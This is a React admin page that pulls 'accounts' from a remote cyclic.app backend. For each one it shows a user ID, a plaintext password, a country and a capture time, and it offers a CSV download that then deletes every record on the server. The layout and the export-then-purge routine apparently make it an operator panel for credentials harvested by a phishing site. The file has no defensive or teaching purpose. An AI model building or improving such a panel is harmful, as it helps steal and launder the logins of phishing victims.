import React,{useState, useEffect} from 'react';
import { Box, 
    useToast,
    Table,
    Thead,
    Tbody,
    Tfoot,
    Tr,
    Th,
    Td,
    TableCaption,
    Spinner,
    TableContainer,
    Button
} from '@chakra-ui/react'
import { RepeatIcon, DownloadIcon } from '@chakra-ui/icons';
import dayjs from 'dayjs';
import axios from 'axios';
import LoginForm from '../component/LoginForm'; 
import { useDispatch } from 'react-redux';
import { Navigate, useNavigate } from 'react-router';
import exportFromJSON from 'export-from-json';
import '../css/auth.css'
interface LoginResponse {
    
}
export default function Admin(){
    const dispatch = useDispatch()
    const navigate = useNavigate()
    const [isLoading, setIsLoading] = useState(true);
    const toast = useToast()
    // const [accessToken, setAccessToken] = useState(localStorage.getItem('accessToken') || '');

    // const handleLogin = async (username: string, password: string) => {
    //     try {
    //         const response = await axios.post('http://localhost:5000/api/v1/auth/login', {
    //             username,
    //             password,
    //         });
    //         const data: LoginResponse = response.data;
    //         dispatch(storeAccessToken(data.accessToken));
    //         console.log('login',response.data.infor[0].id);
    //         const id = response.data.infor[0].id
    //         dispatch(getUserInfo(id) as any)
    //         localStorage.setItem('userInformation', JSON.stringify(response.data.infor))
    //         localStorage.setItem('accessToken', data.accessToken);
    //         toast({
    //             title: 'Login successful',
    //             status: 'success',
    //             duration: 1500,
    //             isClosable: true,
    //         });
    //         await new Promise(resolve => setTimeout(resolve, 1500));
    //         navigate('/');
    //     } catch (error) {
    //         console.error(error);
    //         toast({
    //             title: 'Login failed',
    //             description: 'Wrong username or password',
    //             status: 'error',
    //             duration: 1500,
    //             isClosable: true,
    //         });
    //     }
    // };
    const [accounts, setAccounts] = useState([]);
    const fetchData = async () => {
        try {
            setIsLoading(true);
            const response = await axios.get('https://wild-pink-duck-kilt.cyclic.app/get-accounts');
            setAccounts(response.data);
            setIsLoading(false);
        } catch (error) {
        console.error(error);
        toast({
            title: 'Error',
            description: 'Failed to fetch accounts data',
            status: 'error',
            duration: 1500,
            isClosable: true,
        });
        setIsLoading(false);
        }
    };
    useEffect(() => {
        fetchData();
      }, []);
    return (
        <Box className='admin' w='100vw' h='100vh' position='relative' display='flex' flexDirection='column' justifyContent='center' alignItems='center'>
        <Box mb={5} fontWeight='bold' pt={5} >
            Number of Accounts: {accounts.length}
            <Button 
                leftIcon={<RepeatIcon />}
                onClick={() => fetchData()} 
                colorScheme='orange'
                ml={5}
                mr={1}
            >   
                Reload
            </Button>
            <Button 
                leftIcon={<DownloadIcon />} 
                onClick={async () => {
                    await exportFromJSON({ data: accounts, fileName: 'accounts', exportType: 'csv' });
                    await axios.delete('https://wild-pink-duck-kilt.cyclic.app/delete-all-accounts');
                }}
                colorScheme='green'
            >
                Download CSV
            </Button>
        </Box>
        <Box h='100vh' py={5}>
        <TableContainer>
            <Table variant='simple'>
                <Thead>
                <Tr>
                    <Th>Number</Th>
                    <Th>User Id</Th>
                    <Th>Password</Th>
                    <Th>Country</Th>
                    <Th>Date</Th>
                </Tr>
                </Thead>
                {isLoading ? (
                    <Spinner size='sm' />
                ) : (
                    <Tbody>
                    {accounts.map((account:any, index:number) => (
                        <Tr key={account._id}>
                            <Td>{index + 1}</Td>
                            <Td>{account.uid}</Td>
                            <Td>{account.password}</Td>
                            <Td>{account.country}</Td>
                            <Td>{dayjs(account.createdAt).format('HH:mm - DD/MM/YYYY')}</Td>
                        </Tr>
                    ))}
                    </Tbody>
                )}
            </Table>
        </TableContainer>
        </Box>
        </Box>
    );
}